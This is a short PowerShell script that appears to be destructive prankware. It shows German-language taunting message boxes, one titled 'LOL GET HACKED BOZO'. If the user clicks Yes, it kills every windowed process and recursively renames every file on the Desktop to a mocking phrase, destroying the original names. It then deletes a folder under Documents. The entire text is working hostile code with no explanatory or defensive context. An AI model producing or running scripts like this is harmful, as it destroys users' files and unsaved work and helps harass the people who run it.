Add-Type -AssemblyName PresentationCore, PresentationFramework
$Result = [System.Windows.MessageBox]::Show('Dachtest du wirklich du entkommst mir so einfach?' ,'LOL GET HACKED BOZO' ,'YesNo' ,'Question')
switch($Result){
    'Yes' {
        [System.Windows.MessageBox]::Show('Schlechte Idee' ,'Schon dumm von dir...' ,'Ok' ,'Error')
        Get-Process | Where-Object {$_.MainWindowTitle -ne ''} | Stop-Process
        cd Desktop
        $counter = 0
        Get-ChildItem -Recurse | ForEach-Object {
            $_ | Rename-Item -NewName "DU ENTKOMMST MIR NICHT $(($counter++))$($_.Extension)"
        }
    }
    'No' {[System.Windows.MessageBox]::Show('Besser isses, tschüss jetzt.' ,'Dann hör ich mal lieber auf' ,'Ok' ,'Information')}
}
Remove-Item Documents\SEXWARE\
